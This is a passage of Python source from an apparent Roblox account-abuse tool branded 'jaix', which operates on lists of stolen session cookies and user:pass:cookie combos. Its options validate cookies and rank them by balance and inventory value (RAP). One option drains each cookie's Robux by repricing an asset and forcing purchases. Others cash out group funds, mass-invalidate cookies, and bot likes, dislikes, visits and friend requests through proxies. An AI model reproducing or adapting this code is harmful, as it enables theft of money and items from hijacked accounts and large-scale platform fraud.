    except:
        if r.json()['owner']['username'] != username:
            print(Fore.RED + "[jaix] ==> You do not own this group and therefore cannot be notified of its sales -- Exitting program")
            time.sleep(30)
            sys.exit()
    sales = []
    first = True
    print(Fore.GREEN + "[jaix] ==> Live sales notifier has started")
    while not time.sleep(1):
        try:
            r = req.get(f'https://economy.roblox.com/v1/groups/{groupid}/transactions?limit=10&transactionType=Sale')
            if 'Insufficient permissions.' in r.text:
                input('Insufficient permissions'); exit()
            newsales = r.json()['data']
            if first == True: first = False; sales.extend(newsales)
            for sale in newsales:
                if sale not in sales:
                    sales.append(sale)
                    notify(sale)

        except:
            continue
elif option == 9:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    minimum = 0.01
    checked = 0
    total = 0
    ctypes.windll.kernel32.SetConsoleTitleW(f"Credit: ${total} | Cookies Checked: {checked}/{len(cookies)}")
    ts = []
    for i in cookies:
        t = threading.Thread(target=credit_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("[jaix] ==> Successfully checked through all cookies")
    time.sleep(1)
    if total == 0:
        print(Fore.RED + "[jaix] ==> No credit was found in the cookies")
    else:
        print(Fore.GREEN + f"[jaix] ==> ${total} credit was found in all cookies")
elif option == 10:
    if len(proxies) == 0:
        print(Fore.RED + "[jaix] ==> This tool cannot be used without proxies -- Exitting program")
        time.sleep(30)
        sys.exit()
    threadc = int(input("Enter threads: "))
    minimum = int(input("Enter minimum range: "))
    maximum = int(input("Enter maximum range: "))

    print("[jaix] ==> Beginning checking...")
    valid = 0
    checked = 0
    for i in range(threadc):
        Thread(target=find).start()

    start = time.time()
    time.sleep(0.5)
    while True:
        cpm = round(checked/(round(round(time.time()-start,2)/60,2)))
        ctypes.windll.kernel32.SetConsoleTitleW(f'Valid: {valid} | Checked: {checked} | CPM: {cpm}')
elif option == 11:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    print("[jaix] ==> Beginning checking -- Cookies will be written to output.txt in the form created:cookie")#
    checked = 0
    ctypes.windll.kernel32.SetConsoleTitleW(f'Cookie Age Checker | Checked {checked}/{len(cookies)}')
    ts = []
    for i in cookies:
        t = threading.Thread(target=age_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("[jaix] ==> Successfully checked all cookies -- age:cookie has been written to output.txt")
elif option == 12:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    print("[jaix] ==> Ensure your main cookie that is paying out is in cookie.txt")
    try:
        cookie = open("cookie.txt","r").read().splitlines()[0]
    except:
        print(Fore.RED + "[jaix] ==> No cookie found in cookie.txt -- Exitting program")
        time.sleep(30)
        sys.exit()
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = cookie
    r = req.get('https://www.roblox.com/mobileapi/userinfo')
    if 'mobileapi/user' in r.url:
        print(Fore.GREEN + "[jaix] ==> Valid Cookie Found")
        username = r.json()['UserName']
    else:
        print(Fore.RED + "[jaix] ==> Invalid Cookie -- Exiting Program")
        time.sleep(30)
        sys.exit()
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
        r = req.post('https://auth.roblox.com/v2/login')
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        with lock:
            print(Fore.RED + "[jaix] ==> Proxy Error or Invalid Cookie -- Skipping")
    print(Fore.GREEN + "[jaix] ==> Logged into cookie")
    groupid = int(input("Enter groupID: "))
    r = req.get(f"https://groups.roblox.com/v1/groups/{groupid}")
    try:
        if r.json()['errors'][0]['message'] == "Group is invalid or does not exist.":
            print(Fore.RED + "[jaix] ==> Invalid Group ID provided -- Exitting program")
            time.sleep(30)
            sys.exit()
    except:
        if r.json()['owner']['username'] != username:
            print(Fore.RED + "[jaix] ==> You do not own this group and therefore cannot be notified of its sales -- Exitting program")
            time.sleep(30)
            sys.exit()

    username = str(input("Enter the username of the person you would like to pay out: "))
    amount = int(input("Enter the amount you would like to pay out: "))
    try:
        userid = req.get(f"http://api.roblox.com/users/get-by-username?username={username}").json()['Id']
    except:
        print(Fore.RED + "[jaix] ==> Invalid username provided")

    data = {
  "PayoutType": "FixedAmount",
  "Recipients": [
    {
      "recipientId": userid,
      "recipientType": "User",
      "amount": amount
    }
  ]
}
    r = req.post(f"https://groups.roblox.com/v1/groups/{groupid}/payouts",json=data)
    if 'errors' in r.json():
        if r.json()['errors'][0]['message'] == "The amount is invalid.":
            print(Fore.RED + "[jaix] ==> Not enough funds in groups -- Exitting program")
            time.sleep(30)
            sys.exit()
        elif r.json()['errors'][0]['message'] == "The recipents are invalid.":
            print(Fore.RED + "[jaix] ==> User is not in the group -- Exitting program")
            time.sleep(30)
            sys.exit()
    else:
        print(Fore.GREEN + f"[jaix] ==> {username} has successfully been paid out {amount} from group: {groupid}")
elif option == 13:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    print("[jaix] ==> Ensure that your user:pass:combo are in combos.txt")
    to_convert = open("combos.txt","r").read().splitlines()
    if len(to_convert) == 0:
        print("[jaix] ==> No user:pass:cookie found to convert -- Exitting program")
        time.sleep(30)
        sys.exit()
    checked = 0
    converted = 0
    ctypes.windll.kernel32.SetConsoleTitleW(f'Converted: {converted} | Checked: {checked}/{len(to_convert)}')
    for line in to_convert:
        checked += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'Converted: {converted} | Checked: {checked}/{len(to_convert)}')
        try:
            cookie = line.split(":")[2]
            f = open("output.txt","a+")
            f.write(f"{cookie}\n")
            ctypes.windll.kernel32.SetConsoleTitleW(f'Converted: {converted} | Checked: {checked}/{len(to_convert)}')
            print(Fore.GREEN + "[jaix] ==> Converted a combo to cookie")
            converted += 1
        except:
            print(Fore.RED + "[jaix] ==> Badly formatted -- skipping")
            continue
    print(Fore.GREEN + "[jaix] ==> Successfully converted all combos to just cookie in output.txt")
elif option == 14:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    gameid = int(input("Enter game id to visit bot: "))
    time.sleep(1)
    print("[jaix] ==> Note that the visit bot opens multiple instances of roblox")
    print("[jaix] ==> Beginning visit botting, this may take some times...")
    time.sleep(2)
    subprocess.call("taskkill /f /t /im multi-client.exe")
    os.startfile("multi-client.exe")
    with open("cookies.txt") as f:
        cookies = f.read().splitlines()
        cookies = list(set(cookies))
    for x in cookies:
        threading.Thread(target=visit).start()
    print(Fore.GREEN + "[jaix] ==> Visit botting in progress...")
elif option == 15:
    print("\n[jaix] ==> Note that this option does need proxies")
    time.sleep(1)
    print("[jaix] ==> Note that the cookies must have played the game before being able to like the game")
    print("[jaix] ==> Run the game visit bot on the game if they have not played it before and wait for it to finish")
    time.sleep(1)
    game_id = int(input("Enter gameID of the game you would like to bot: "))
    print("[jaix] ==> Beginning like botting...")
    checked = 0
    liked = 0
    ctypes.windll.kernel32.SetConsoleTitleW(f'Liked: {liked} | Progress: {checked}/{len(cookies)}')
    ts = []
    for i in cookies:
        t = threading.Thread(target=game_like,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if liked == 0:
        print(Fore.RED + "[jaix] ==> No likes were given, this may be because your cookies need to play the game first")
    else:
        print("[jaix] ==> Successfully liked with all possible valid cookies that have played the game before")
elif option == 16:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    print("[jaix] ==> Beginning verified checker")
    verified = 0
    checked = 0
    unverified = 0
    ts = []
    for i in cookies:
        t = threading.Thread(target=verified_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if unverified == 0:
        print(Fore.RED + "[jaix] ==> No unverified cookies were found")
    elif unverified > 0:
        print(Fore.GREEN + f"[jaix] ==> {unverified} unverified cookies found")
elif option == 17:
    killed = 0
    checked = 0
    print("\n[jaix] ==> Note that this option does need proxies")
    ts = []
    for i in cookies:
        t = threading.Thread(target=invalidate,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if killed == 0:
        print(Fore.RED + "[jaix] ==> Was unable to kill/invalidate any cookies")
    elif killed > 0:
        print(Fore.GREEN + f"[jaix] ==> {killed} cookies were invalidated/killed")
elif option == 18:
    checked = 0
    total = 0
    print("[jaix] ==> Note that this option does need proxies")
    print(Fore.RED + "[jaix] ==> This tool was not tested before being published, you may encounter bugs")
    minimum = int(input("Enter minimum amount to transfer: "))
    cookie = open('cookie.txt','r').readline().strip()
    assetid = int(input("Enter ID of asset to buy: "))
    req = requests.Session()
    req2 = requests.Session()
    req.cookies['.ROBLOSECURITY'] = cookie
    r = req.get('http://www.roblox.com/mobileapi/userinfo')
    if 'mobileapi/user' not in r.url:
        print(Fore.RED + "[jaix] ==> Cookie Invalid -- The cookie that changes the prices of the asset does not work! Exitting program")
        time.sleep(10)
        sys.exit()
    else:
        print(Fore.GREEN + "[jaix] ==> Cookie has been validated")
    r = req.post('https://auth.roblox.com/v2/login')
    req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']

    try:
        r = requests.get(f'https://api.roblox.com/Marketplace/ProductInfo?assetId={assetid}').json()
        productid = r['ProductId']
        creatorid = r['Creator']['Id']
        print(Fore.GREEN + "[jaix] ==> Found Asset")
    except:
        print(Fore.RED + "[jaix] ==> Asset Invalid -- The asset to buy is invalid! Exitting program")
        time.sleep(10)
        sys.exit()

    def change(price):
        try:
            r = req.post(f'https://itemconfiguration.roblox.com/v1/assets/{assetid}/update-price',json={'priceConfiguration': {'priceInRobux': price}},proxies=random.choice(proxies))
            if 'X-CSRF-TOKEN' in r.headers:
                req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
                toggle(price)
            if r.json() != {}:
                print(Fore.RED + f"[jaix] ==> Potential error -- Error message: {r.json()}")
        except:
            change(price)
    ctypes.windll.kernel32.SetConsoleTitleW(f'Total Robux Transferred: 0 | Checked: {checked}/{len(cookies)}')
    for i in cookies:
        checked += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'Total Robux Transferred: {total} | Checked: {checked}/{len(cookies)}')
        req2.cookies['.ROBLOSECURITY'] = i
        r = req2.get("https://www.roblox.com/mobileapi/userinfo")
        if "mobileapi/user" not in r.url:
            checked += 1
            print(Fore.RED + "[jaix] ==> Cookie is banned/invalid")
            continue
        try:
            r = req2.get('https://api.roblox.com/users/account-info').json()
            balance = r['RobuxBalance']
            if balance >= minimum:
                print(Fore.GREEN + f"[jaix] ==> Robux Cookie Found -- Cookie found with {balance} robux")
            elif balance < minimum and balance != 0:
                print(Fore.RED + f"[jaix] ==> Robux Cookie Found -- Cookie found with {balance} robux but is under the minimum you set!")
                continue
            elif balance == 0:
                continue
        except:
            print(Fore.RED + "[jaix] ==> Error -- Error getting robux balance")
            cookies.append(i)
            print(Fore.RED + "[jaix] ==> Error -- Retrying cookie towards the end")
            continue
        r = req2.post('https://auth.roblox.com/v2/login')
        if 'X-CSRF-TOKEN' in r.headers:
            req2.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        change(balance)
        try:
            r = req2.post(f'https://economy.roblox.com/v1/purchases/products/{productid}',data={"expectedCurrency":1,"expectedPrice":balance,"expectedSellerId":creatorid},proxies=random.choice(proxies))
        except:
            print(Fore.RED + "[jaix] ==> Failed to purchase -- Retrying at the end")
            cookies.append(i)
            continue
        if 'errors' in r.json():
            print(Fore.RED + f"[jaix] ==> Following error occured: {r.json()}")
        else:
            if r.json()['purchased'] == False:
                if r.json()['reason'] == "AlreadyOwned":
                    r = req2.post('https://www.roblox.com/asset/delete-from-inventory',json={'assetId':assetid},proxies=random.choice(proxies))
                    if r.status_code != 200:
                        print(Fore.RED + "[jaix] ==> Error -- Cookie already owns this asset but there was an error deleting it from its inventory")
                    else:
                        print(Fore.GREEN + "[jaix] ==> Successfully Deleted -- Cookie already owned this asset but it has been deleted")
                        cookies.append(i)
                else:
                    print(Fore.RED + f"[jaix] ==> Following error occured: {r.json()}")
                    cookies.append(i)
            else:
                total += balance
                print(Fore.GREEN + f"[jaix] ==> Bought asset for {balance} robux | Total: {total}")
        ctypes.windll.kernel32.SetConsoleTitleW(f'Total Robux Transferred: {total} | Checked: {checked}/{len(cookies)}')
    print(Fore.GREEN + "[jaix] ==> Completed Checking -- Successfully transferred all possible robux!")
elif option == 19:
    print("[jaix] ==> Note that this option does need proxies")
    changed = 0
    checked = 0
    status = str(input("Enter the status you would like to change to on your cookies: "))
    print("[jaix] ==> Beginning mass status change...")
    time.sleep(1)
    ts = []
    for i in cookies:
        t = threading.Thread(target=status_change,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if changed == 0:
        print(Fore.RED + "[jaix] ==> Was unable to change status for any cookies")
    elif changed > 0:
        print(Fore.GREEN + f"[jaix] ==> {changed} cookies statuses were changed to: {status}")
elif option == 20:
    print("[jaix] ==> Note that this option does need proxies")
    cashed_out = 0
    checked_groups = 0
    ctypes.windll.kernel32.SetConsoleTitleW(f'Cashed out: {cashed_out} | Checked Groups: {checked_groups}')
    cookie = str(input("Enter cookie that you are cashing out from: "))
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = cookie
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
        r = req.post('https://auth.roblox.com/v2/login')
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        print(Fore.RED + "[jaix] ==> You entered an invalid cookie -- exitting program")
        time.sleep(30)
        sys.exit()
    print("[jaix] ==> Beginning cash out process")
    print("[jaix] ==> Please wait whilst grabbing groups that you own...")
    r = req.get("https://users.roblox.com/v1/users/authenticated").json()
    userId = r['id']
    r = req.get(f"https://api.roblox.com/users/{userId}/groups")
    print(Fore.GREEN + f"[jaix] ==> Detected {len(r.json())} groups")
    groups = []
    for group in r.json():
        checked_groups += 1
        if group['Rank'] != 255:
            pass
        else:
            groups.append(group['Id'])
    print(Fore.GREEN + f"[jaix] ==> You own {len(groups)}/{len(r.json())} groups")
    for group in groups:
        try:
            unpend = req.get(f'https://economy.roblox.com/v1/groups/{group}/currency',proxies=random.choice(proxies))
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy error -- retrying at the end")
            groups.append(group)
            if checked_groups > 0:
                checked_groups -= 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'Cashed out: {cashed_out} | Checked Groups: {checked_groups}')
            continue
        if unpend == 0:
            print(Fore.RED + "[jaix] ==> Group has no robux -- skipping")
            continue
        data={
"PayoutType": "FixedAmount",
"Recipients": [
{
"recipientId": userId,
"recipientType": "User",
"amount": unpend
}
]
}
        try:
            r = req.post(f"https://groups.roblox.com/v1/groups/{group}/payouts",json=data,proxies=random.choice(proxies))
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy error -- retrying at the end")
            groups.append(group)
            if checked_groups > 0:
                checked_groups -= 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'Cashed out: {cashed_out} | Checked Groups: {checked_groups}')
            continue
        if 'errors' in r.json():
            with lock:
                print(Fore.RED + f"Payment error -- Error message: {r.json()['errors'][0]['message']}")
            if r.json()['errors'][0]['message'] == "The amount is invalid.":
                with lock:
                    print(Fore.RED + "Not enough funds in the group to cash out -- something went wrong")
        else:
            with lock:
                print(Fore.GREEN + f"[jaix] ==> Successfully paid out {unpend} to cookie")
            cashed_out += unpend
            ctypes.windll.kernel32.SetConsoleTitleW(f'Cashed out: {cashed_out} | Checked Groups: {checked_groups}')
    if cashed_out == 0:
        print(Fore.RED + "[jaix] ==> No robux was cashed out")
    elif cashed_out > 0:
        print(Fore.GREEN + f"[jaix] ==> Successfully cashed out {cashed_out} to cookie")
elif option == 21:
    print("\n[jaix] ==> Note that this option does need proxies")
    time.sleep(1)
    print("[jaix] ==> Note that the cookies must have played the game before being able to dislike the game")
    print("[jaix] ==> Run the game visit bot on the game if they have not played it before and wait for it to finish")
    time.sleep(1)
    game_id = int(input("Enter gameID of the game you would like to bot: "))
    print("[jaix] ==> Beginning dislike botting...")
    checked = 0
    disliked = 0
    ctypes.windll.kernel32.SetConsoleTitleW(f'Disiked: {disliked} | Progress: {checked}/{len(cookies)}')
    ts = []
    for i in cookies:
        t = threading.Thread(target=game_dislike,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if liked == 0:
        print(Fore.RED + "[jaix] ==> No dislikes were given, this may be because your cookies need to play the game first")
    else:
        print("[jaix] ==> Successfully disliked with all possible valid cookies that have played the game before")
elif option == 22:
    print("[jaix] ==> Credits to Vision#1420 for this tool")
    url = "https://minecraft.net"
    timeout = 15
    thread_count = 800
    good = 0
    bad = 0
    with open("proxies.txt") as f:
        proxies = f.read().splitlines()
        proxies = list(set(proxies))
    total_proxies = len(proxies)
    class hack:
        def __init__(self):
            global url
            global timeout
            self.session = requests.Session()
        def check_proxy(self,proxy):
            proxy={"https":proxy,"http":proxy}
            try:
                check = self.session.get(url,timeout=timeout,proxies=proxy)
                return True
            except Exception as e:
                return False


    def thread():
        global good, bad, lock
        while proxies:
            proxy = proxies.pop()
            checks = hack()
            check = checks.check_proxy(proxy)
            if check != False:
                with lock:
                    print(Fore.GREEN+f"[jaix] ==> Alive PROXY : {proxy}")
                f = open("output.txt","a+").write(f"{proxy}\n")
                good +=1
            else:
                with lock:
                    print(Fore.RED+f"[jaix] ==> Dead PROXY : {proxy}")
                bad +=1

            ctypes.windll.kernel32.SetConsoleTitleW(f"Proxy Checker | Total : {total_proxies} | Checked : {total_proxies-len(proxies)} | Good : {good} | Bad : {bad}")


    for _ in range(thread_count):
        threading.Thread(target=thread).start()

    ctypes.windll.kernel32.SetConsoleTitleW(f"Proxy Checker | Total : {total_proxies} | Checked : {total_proxies-len(proxies)} | Good : {good} | Bad : {bad}")
elif option == 23:
    print("[jaix] ==> Note that this option requires proxies")
    id = int(input("Enter the ID of the person you would like to bot friend requests to: "))
    sent = 0
    checked = 0
    ts = []
    for i in cookies:
        t = threading.Thread(target=friend_request,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if sent == 0:
        print(Fore.RED + "[jaix] ==> No friend requests were sent")
    elif sent > 0:
        print(Fore.GREEN + f"[jaix] ==> Successfully sent {sent} friend requests to {id}")
elif option == 24:
    print("[jaix] ==> Note that this option doesn't requires proxies")
    threadc = 25
    combolist = open('cookies.txt','r').read().splitlines()

    done = 0
    dict = {}

    def divide(stuff):
        return [stuff[i::threadc] for i in range(threadc)]

    def getRAP(userid,rap,cursor,req):
        global lock
        if cursor:
            r = req.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?limit=100&cursor={cursor}').json()
        else:
            r = req.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?limit=100').json()
        for item in r['data']:
            try:
                rap += item['recentAveragePrice']
                with lock:
                    print(Fore.GREEN + f"[jaix] ==> Found Cookie with {item['recentAveragePrice']} rap")
            except:
                pass
        ncursor = r['nextPageCursor']
        if ncursor:
            return getRAP(userid,rap,ncursor,req)
        else:
            return rap

    def cpm():
        while True:
            ctypes.windll.kernel32.SetConsoleTitleW(f'Progress: {done}/{len(combolist)}')
            if done == len(combolist):
                break

    def check(combos):
        global done
        req = requests.Session()
        for combo in combos:
            try:
                cookie = '_|'+combo.split('_|')[-1]
                userpass = combo.split(':_|')[0]
            except: done += 1; continue
            req.cookies['.ROBLOSECURITY'] = cookie
            try:
                r = req.get('https://www.roblox.com/mobileapi/userinfo')
                if 'mobileapi/user' in r.url:
                    userid = r = req.get('https://api.roblox.com/users/account-info').json()['UserId']
                    while True:
                        try: rap = getRAP(userid,0,None,req); break
                        except: pass
                    dict.setdefault(rap,[]).append(str(rap)+':'+userpass+'\n')
                done += 1
            except: combos.append(combo); done -= 1

    threads = []
    for i in range(threadc):
        threads.append(Thread(target=check,args=[divide(combolist)[i]]))
        threads[i].start()
    Thread(target=cpm).start()
    for thread in threads:
        thread.join()

    with open('output.txt', 'w') as f:
        for rap in sorted(dict, reverse=True):
            f.writelines(dict[rap])

    print(Fore.GREEN + "[jaix] ==> Successfully completed rap checker | rap:cookie has been written to output.txt")
elif option == 25:
    print("[jaix] ==> Note that this option doesn't requires proxies")

    cookie = str(input("Enter Cookie: "))
    groupids = input("Enter GroupID: ")
    groupids = int(groupids)
    webhook = str(input("Enter webhook link: "))

    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = cookie
    r = req.get('https://www.roblox.com/mobileapi/userinfo')
    if 'mobileapi/user' not in r.url:
        print(Fore.RED + "[jaix] ==> Invalid cookie -- exitting program")
        time.sleep(30)
        sys.exit()

    def notify(payout,unpend,webhook):
        content = {
            "embeds": [{
                "color": 65280,
                "title": f"New Payout",
                "timestamp": str(datetime.datetime.now().astimezone()),
                "fields" : [
                    {
                        "name": "Amount:",
                        "value": payout['description']['Amount'],
                        "inline": False
                    },
                    {
                        "name": "Remaining Funds:",
                        "value": unpend,
                        "inline": False
                    }
                ],
            }]
        }
        print(Fore.GREEN + '[jaix] ==> New Payout:',payout['description']['Amount'])
        r = requests.post(webhook,json=content)

    auditlog = []
    first = True
    print('[jaix] ==> Waiting for payouts to come out of group\nYou will be notified of payouts')
    while not time.sleep(1):
        try:
            for groupid in groupids:
                r = req.get(f'https://groups.roblox.com/v1/groups/{groupid}/audit-log?cursor=&limit=50&sortOrder=Asc')
                if 'Authorization has been denied for this request.' in r.text:
                    print(f'Insufficient permissions - {groupid}')
                new = r.json()['data']
                if first == True: auditlog.extend(new)
                for item in new:
                    if item['actionType'] == 'Spend Group Funds':
                        if item not in auditlog:
                            auditlog.append(item)
                            unpend = req.get(f'https://economy.roblox.com/v1/groups/{groupid}/currency')
                            if 'TooManyRequests' in unpend.text:
                                unpend = 'Too Many Requests'
                            unpend = unpend.json()['robux']
                            notify(item,unpend,webhook)
            if first == True: first = False
        except:
            pass
else:
    print(Fore.RED + "[jaix] ==> You picked an invalid option -- exitting program")
    time.sleep(30)
    sys.exit()




























time.sleep(100)
sys.exit()
